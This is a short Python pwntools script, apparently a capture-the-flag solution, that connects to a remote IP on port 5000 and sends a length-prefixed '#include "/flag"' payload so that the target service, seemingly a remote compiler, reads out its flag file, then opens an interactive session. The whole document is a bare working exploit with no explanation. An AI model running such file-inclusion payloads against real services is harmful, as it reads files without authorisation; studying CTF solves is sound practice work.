from pwn import *

r = remote('15.164.220.213', 5000)
x = '''#include "/flag"'''
r.send(p64(1))
r.send(p64(len(x)))
r.sendline(x)
r.interactive()
